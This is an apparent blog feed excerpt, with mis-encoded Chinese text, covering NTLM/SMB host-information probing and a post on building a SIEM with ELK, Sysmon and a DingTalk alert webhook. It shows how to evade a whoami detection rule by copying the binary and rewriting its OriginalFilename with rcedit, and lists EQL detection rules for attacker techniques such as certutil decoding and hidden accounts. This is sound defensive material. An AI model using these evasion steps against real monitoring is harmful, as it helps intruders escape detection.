&lt;h3 id=&quot;NTLM&quot;&gt;&lt;a href=&quot;#NTLM&quot; class=&quot;headerlink&quot; title=&quot;NTLM&quot;&gt;&lt;/a&gt;NTLM&lt;/h3&gt;&lt;p&gt;åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„&lt;/p&gt;
&lt;h3 id=&quot;SMBv1&quot;&gt;&lt;a href=&quot;#SMBv1&quot; class=&quot;headerlink&quot; title=&quot;SMBv1&quot;&gt;&lt;/a&gt;SMBv1&lt;/h3&gt;&lt;p&gt;ä½¿ç”¨&lt;a href=&quot;https://github.com/FeigongSec/NTLMINFO&quot;&gt;éæ”»NTLMINFO&lt;/a&gt;æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š&lt;br&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png&quot;&gt;&lt;br&gt;æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)
Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)
Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯&lt;code&gt;Security Blob Length&lt;/code&gt;å’Œ&lt;code&gt;Byte Content&lt;/code&gt;ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š&lt;/p&gt;
&lt;h6 id=&quot;GSS-APIçš„é•¿åº¦æ˜¯271-Byte&quot;&gt;&lt;a href=&quot;#GSS-APIçš„é•¿åº¦æ˜¯271-Byte&quot; class=&quot;headerlink&quot; title=&quot;GSS-APIçš„é•¿åº¦æ˜¯271 Byte&quot;&gt;&lt;/a&gt;GSS-APIçš„é•¿åº¦æ˜¯271 Byte&lt;/h6&gt;&lt;p&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;Native-OSçš„é•¿åº¦æ˜¯42-Byte&quot;&gt;&lt;a href=&quot;#Native-OSçš„é•¿åº¦æ˜¯42-Byte&quot; class=&quot;headerlink&quot; title=&quot;Native OSçš„é•¿åº¦æ˜¯42 Byte&quot;&gt;&lt;/a&gt;Native OSçš„é•¿åº¦æ˜¯42 Byte&lt;/h6&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>SIEM On ELK</title>
    <link href="https://jkme.github.io/2021/08/02/siem-on-elk.html"/>
    <id>https://jkme.github.io/2021/08/02/siem-on-elk.html</id>
    <published>2021-08-01T16:00:00.000Z</published>
    <updated>2022-01-21T03:00:01.072Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å‚è€ƒé“¾æ¥é‡Œæœ‰è¯¦ç»†çš„å®‰è£…æ­¥éª¤ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯Windowsï¼Œå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š</p><ul><li>sysmon.exe(<a href="https://github.com/SwiftOnSecurity/sysmon-config">é…ç½®æ–‡ä»¶</a>)<ul><li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li></ul></li><li>winlogbeat.exe<ul><li><code>.\install-service-winlogbeat.ps1</code></li><li><code>.\winlogbeat.exe setup -e</code></li></ul></li><li>ElasticAgent.exe<ul><li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li></ul></li></ul><h3 id="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"><a href="#è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡" class="headerlink" title="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"></a>è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡</h3><p>è§„åˆ™æœ‰5ç§æŸ¥è¯¢ï¼Œä¸€èˆ¬ä½¿ç”¨EQL(Event Query Language)æŸ¥è¯¢ç±»å‹:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEMæœ‰å†…ç½®å¾ˆå¤šè§„åˆ™ï¼Œé»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œè¿™äº›è§„åˆ™éƒ½æ˜¯ATT&amp;CKæ¡†æ¶æ”»å‡»è¡Œä¸ºè½¬åŒ–è€Œæ¥çš„ï¼Œä¾‹å¦‚windowsä¸‹çš„<code>whoami</code>æŸ¥è¯¢è§„åˆ™(<del>æ­£ç»äººè°æŸ¥whoamiå•Š</del>):</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬æ‹¿è¿™æ¡è§„åˆ™åšåˆ†æï¼Œè¿™æ¡è§„åˆ™åŒ¹é…äº†å½“è¿›ç¨‹å¼€å§‹çš„æ—¶å€™ï¼Œè¿›ç¨‹åä¸º<code>whoami.exe</code>çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ<code>whoami.exe</code>å¤åˆ¶ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡å»äº†:</p><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exeC:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ˜¯ä¸æ˜¯æŠŠsiemæƒ³çš„ç®€å•äº†ï¼Œè¿™è·Ÿé€šè¿‡å¤åˆ¶<code>net.exe</code>ç»•è¿‡æ·»åŠ ç”¨æˆ·ä¸€æ¨¡ä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿä¸‹elké‡Œé¢çš„å­—æ®µï¼Œå¯ä»¥å‘ç°<code>process.pe.original_file_name</code>ä»ç„¶ä¿ç•™äº†<code>whoami.exe</code>ï¼Œè¿™æ˜¯PEæ–‡ä»¶é‡Œé¢å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æŠŠé¢„è­¦è§„åˆ™ä¿®æ”¹ä¸€ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶é€šè¿‡å¤åˆ¶ç»•è¿‡å°±å¤±æ•ˆäº†ï¼Œé‚£ä¹ˆ<code>process.pe.original_file_name</code>èƒ½ä¸èƒ½æ”¹å‘¢ï¼Ÿå¯ä»¥çš„ï¼Œ<a href="https://github.com/electron/rcedit/releases">rcedit</a>:</p><pre class="line-numbers language-none"><code class="language-none">cedit-x64.exe x.exe --set-version-string  OriginalFilename &quot;hello.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-2.png"></p><p>æ­¤æ—¶å†æ¬¡æ‰§è¡Œ<code>x.exe</code>ï¼ŒSIEMé‡Œé¢ä¸ä¼šæœ‰å‘Šè­¦ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼ç»•è¿‡å’Œ<code>process.pe.original_file_name</code>ç›¸å…³çš„è§„åˆ™ï¼Œæ‰€ä»¥åœ¨å®é™…è¿‡ç¨‹ä¸­ï¼Œè¦ä»å¤šä¸ªç»´åº¦æ€è€ƒï¼Œæ¯”å¦‚networkã€æ³¨å†Œè¡¨ã€äº‹ä»¶ID</p><h3 id="å‘Šè­¦é€šçŸ¥"><a href="#å‘Šè­¦é€šçŸ¥" class="headerlink" title="å‘Šè­¦é€šçŸ¥"></a>å‘Šè­¦é€šçŸ¥</h3><p>ELKçš„åŸºç¡€ç‰ˆæ²¡æœ‰ç”¨æˆ·é€šçŸ¥çš„åŠŸèƒ½ï¼Œéœ€è¦å¼€é€šç™½é‡‘ç‰ˆï¼Œå¯ä»¥ç”³è¯·è¯•ç”¨30å¤©æˆ–è€…ç ´è§£ï¼Œå¦‚æœæƒ³é€šçŸ¥é’‰é’‰ï¼Œå¯ä»¥é€‰æ‹©webhookçš„æ–¹å¼ï¼Œåœ¨webhookçš„æ—¶å€™æ³¨æ„æ·»åŠ ä¸€ä¸ªè¯·æ±‚å¤´å­—æ®µ:<code>Content-Type: application/x-wwww-form-data</code>ï¼ŒActioné‡Œé¢å¢åŠ bodyæ ¼å¼:</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;#context.alerts&#125;&#125;timestamp&#x3D;&#123;&#123;@timestamp&#125;&#125;&amp;rule_name&#x3D;&#123;&#123;context.rule.name&#125;&#125;&amp;risk_score&#x3D;&#123;&#123;context.rule.risk_score&#125;&#125;&amp;host_name&#x3D;&#123;&#123;host.name&#125;&#125;&amp;process_parent_name&#x3D;&#123;&#123;process.parent.name&#125;&#125;&amp;process_command_line&#x3D;&#123;&#123;process.command_line&#125;&#125;&amp;process_name&#x3D;&#123;&#123;process.name&#125;&#125;&amp;user_name&#x3D;&#123;&#123;user.name&#125;&#125;&amp;result_link&#x3D;&#123;&#123;&#123;context.results_link&#125;&#125;&#125;&#123;&#123;&#x2F;context.alerts&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯è§£æbodyç„¶åé€šçŸ¥é’‰é’‰ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> request<span class="token punctuation">.</span>form    <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>    timestamp <span class="token operator">=</span> date2local<span class="token punctuation">(</span>form<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    rule_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"rule_name"</span><span class="token punctuation">]</span>    <span class="token comment"># risk_score = form["risk_score"]</span>    host_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"host_name"</span><span class="token punctuation">]</span>    process_parent_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_parent_name"</span><span class="token punctuation">]</span>    process_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_name"</span><span class="token punctuation">]</span>    process_command_line <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_command_line"</span><span class="token punctuation">]</span>    user_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span>    result_link <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"result_link"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"%0a"</span><span class="token punctuation">)</span>    dingTalk_notify<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">date2local</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>    date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%fZ"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dingTalk_notify</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> <span class="token string">""</span>      ddrobot <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://oapi.dingtalk.com/robot/send?access_token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span>    <span class="token punctuation">&#125;</span>    json_text <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"msgtype"</span><span class="token punctuation">:</span> <span class="token string">"markdown"</span><span class="token punctuation">,</span>        <span class="token string">"markdown"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"SIEMå‘Šè­¦"</span></span><span class="token punctuation">,</span>            <span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"### SIEMå‘Šè­¦é€šçŸ¥\n##### è§¦å‘æ—¶é—´: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>timestamp<span class="token punctuation">&#125;</span></span><span class="token string">\n##### è§¦å‘è§„åˆ™: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>rule_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### è§¦å‘ä¸»æœº: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### å…³è”çˆ¶è¿›ç¨‹: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_parent_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### å½“å‰è¿›ç¨‹: "</span></span>                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_name<span class="token punctuation">&#125;</span></span><span class="token string">\n#### è¿›ç¨‹å‚æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_command_line<span class="token punctuation">&#125;</span></span><span class="token string">\n##### å½“å‰ç”¨æˆ·: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### [å‘Šè­¦è¯¦æƒ…](</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result_link<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token string">"at"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"atMobiles"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"isAtAll"</span><span class="token punctuation">:</span> <span class="token string">"false"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>ddrobot<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json_text<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-3.png"></p><h3 id="è§„åˆ™ç¤ºä¾‹"><a href="#è§„åˆ™ç¤ºä¾‹" class="headerlink" title="è§„åˆ™ç¤ºä¾‹"></a>è§„åˆ™ç¤ºä¾‹</h3><p>SIEMå†…ç½®çš„è§„åˆ™æœ‰å¾ˆå¤šï¼Œå¸¸ç”¨çš„è§„åˆ™æ‰“å¼€çš„æœ‰å¦‚ä¸‹å‡ ä¸ª:<br>è§„åˆ™åç§°ï¼šConhost Spawned By Suspicious Parent Process<br>è§„åˆ™ä»‹ç»ï¼šConsole Window Host (conhost.exe)ä½œä¸ºå­è¿›ç¨‹è¢«å¯åŠ¨ï¼Œé€šå¸¸æ˜¯åœ¨ä»£ç æ³¨å…¥è¿›ç¨‹çš„æ—¶å€™å‡ºç°</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.name : &quot;conhost.exe&quot; and  process.parent.name : (&quot;svchost.exe&quot;, &quot;lsass.exe&quot;, &quot;services.exe&quot;, &quot;smss.exe&quot;, &quot;winlogon.exe&quot;, &quot;explorer.exe&quot;,                         &quot;dllhost.exe&quot;, &quot;rundll32.exe&quot;, &quot;regsvr32.exe&quot;, &quot;userinit.exe&quot;, &quot;wininit.exe&quot;, &quot;spoolsv.exe&quot;,                         &quot;wermgr.exe&quot;, &quot;csrss.exe&quot;, &quot;ctfmon.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šEncoding or Decoding Files via CertUtil<br>è§„åˆ™ä»‹ç»ï¼šé€šè¿‡CertUtilç¼–ç è§£ç æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">process where event.type &#x3D;&#x3D; &quot;start&quot; and  (process.name : &quot;certutil.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;CertUtil.exe&quot;) and  process.args : (&quot;?decode&quot;, &quot;?encode&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šUnusual Child Processes of RunDLL32<br>è§„åˆ™ä»‹ç»ï¼šä¸æ­£å¸¸çš„rundll32.exeæ´»åŠ¨ï¼ˆé€šå¸¸ç”¨åœ¨å¯åŠ¨æœ¨é©¬è¿‡ç¨‹ä¸­ï¼Œæ¯”å¦‚CSçš„Spawnï¼‰</p><pre class="line-numbers language-none"><code class="language-none">sequence with maxspan&#x3D;1h  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and     (process.name : &quot;rundll32.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;RUNDLL32.EXE&quot;) and      process.args_count &#x3D;&#x3D; 1  ] by process.entity_id  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.parent.name : &quot;rundll32.exe&quot;  ] by process.parent.entity_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šCreation of a Hidden Local User Account<br>è§„åˆ™ä»‹ç»ï¼šæ·»åŠ éšè—è´¦æˆ·ï¼ˆç”¨äºæƒé™ç»´æŒï¼‰</p><pre class="line-numbers language-none"><code class="language-none">registry where registry.path : &quot;HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\*$\\&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šWindows Script Executing PowerShell<br>è§„åˆ™ä»‹ç»ï¼šä½¿ç”¨wscriptæˆ–è€…cscriptæ‰§è¡ŒPowershell</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.parent.name : (&quot;cscript.exe&quot;, &quot;wscript.exe&quot;) and process.name : &quot;powershell.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šWindows Suspicious Command<br>è§„åˆ™ä»‹ç»ï¼šWindowså¯ç–‘å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) andprocess.pe.original_file_name in (&quot;whoami.exe&quot;, &quot;tasklist.exe&quot;, &quot;ipconfig.exe&quot;, &quot;powershell.exe&quot;, &quot;sctasks.exe&quot;, &quot;bitsadmin.exe&quot;, &quot;netstat.exe&quot;, &quot;systeminfo.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šSecurity Software Discovery using WMIC<br>è§„åˆ™ä»‹ç»ï¼šä½¿ç”¨wmicæŸ¥è¯¢å®‰å…¨è½¯ä»¶</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and   (process.name:&quot;wmic.exe&quot; or process.pe.original_file_name:&quot;wmic.exe&quot;) and    process.args:&quot;&#x2F;namespace:\\\\root\\SecurityCenter2&quot; and process.args:&quot;Get&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šNet command via SYSTEM account<br>è§„åˆ™ä»‹ç»ï¼šä»¥SYSTEMæƒé™æ‰§è¡Œnet.exe</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  user.id in (&quot;S-1-5-18&quot;, &quot;S-1-5-19&quot;, &quot;S-1-5-20&quot;) and  process.name : &quot;whoami.exe&quot; or  (process.name : &quot;net1.exe&quot; and not process.parent.name : &quot;net.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/SigmaHQ/sigma">sigma</a>(Generic Signature Format for SIEM Systems)ï¼Œè¿™ç§æè¿°æ–¹å¼ç‰¹åˆ«åƒç—…æ¯’è½¯ä»¶çš„ç‰¹å¾ç ã€‚</p><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><ul><li>ç»•è¿‡çš„æ–¹å¼åº”è¯¥è¿˜æœ‰å¾ˆå¤šï¼Œæœªæµ‹è¯•</li><li>å®‰éª‘å£«çš„åŸç†ç±»ä¼¼ï¼Œæ¯”å¦‚ç¢°åˆ°è¿‡é˜¿é‡Œäº‘ä¸Šæ‰§è¡Œ<code>whoamiã€systeminfo</code>å°±å‘Šè­¦</li><li>çœ‹å®Œ<a href="http://weizn.net/?p=439">é€šè¿‡SYSMONæ—¥å¿—æ£€æµ‹Cobalt Strikeæœ¨é©¬</a>æˆ‘è§‰å¾—è¿™ä¸ªæ‰æ˜¯SIEMçš„è§£å†³æ–¹å¼</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-1">SIEMå®éªŒç³»åˆ—-1</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-2">SIEMå®éªŒç³»åˆ—-2</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-3">SIEMå®éªŒç³»åˆ—-3</a></li><li><a href="http://weizn.net/?p=439">é€šè¿‡SYSMONæ—¥å¿—æ£€æµ‹Cobalt Strikeæœ¨é©¬</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h3&gt;&lt;p&gt;å‚è€ƒé“¾æ¥é‡Œæœ‰è¯¦ç»†çš„å®‰è£…æ­¥éª¤ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯Windowsï¼Œå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sysmon.exe(&lt;a href=&quot;https://github.com/SwiftOnSecurity/sysmon-config&quot;&gt;é…ç½®æ–‡ä»¶&lt;/a&gt;)&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\sysmon64.exe -accepteula -i c:\windows\config.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;winlogbeat.exe&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\install-service-winlogbeat.ps1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.\winlogbeat.exe setup -e&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ElasticAgent.exe&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\elastic-agent.exe install  --insecure -f --fleet-server-es=&amp;lt;ES&amp;gt; --fleet-server-service-token=&amp;lt;token&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
